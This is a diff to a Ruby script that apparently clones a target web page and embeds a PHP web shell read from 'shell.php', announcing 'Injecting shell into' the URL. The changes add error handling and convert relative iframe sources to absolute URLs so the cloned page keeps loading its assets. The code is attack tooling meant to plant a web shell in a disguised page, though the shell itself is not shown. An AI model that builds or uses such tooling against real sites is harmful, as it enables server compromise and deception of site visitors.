@@ -14,7 +14,11 @@ baseurl = URI(url).scheme + "://" + URI(url).host
 
 puts "Injecting shell into #{url}"
 
-page_raw = @agent.get(url).body()
+begin
+	page_raw = @agent.get(url).body()
+rescue Mechanize::ResponseCodeError => ex
+	page_raw = ex.page.body
+end
 shell = File.open("shell.php", "r").read()
 
 page_html = Nokogiri::HTML(page_raw)
@@ -23,6 +27,7 @@ images = page_html.css("img")
 scripts = page_html.css("script")
 links = page_html.css("a")
 css = page_html.css("link")
+iframes = page_html.css("iframe")
 
 fixes = 0
 
@@ -77,6 +82,22 @@ for script in scripts
 	end
 end
 
+for iframe in iframes
+	begin
+		if iframe["src"][0..3] != "http" and iframe["src"][0..1] == "/"
+			iframe["src"] = "http:" + iframe["src"]
+			fixes += 1
+		elsif iframe["src"][0] == "/"
+			iframe["src"] = baseurl + iframe["src"]
+			fixes += 1 
+		elsif iframe["src"][0..1] == ".."
+			iframe["src"] = url + iframe["src"]
+			fixes += 1
+		end
+	rescue Exception => e
+	end
+end
+
 for stylesheet in css
 	begin
 		if stylesheet["href"][0..3] != "http" and stylesheet["href"][0..1] == "/"
@@ -92,6 +113,7 @@ for stylesheet in css
 	rescue Exception => e
 	end
 end
+
 
 puts "Fixed #{fixes} dependency issues"
 
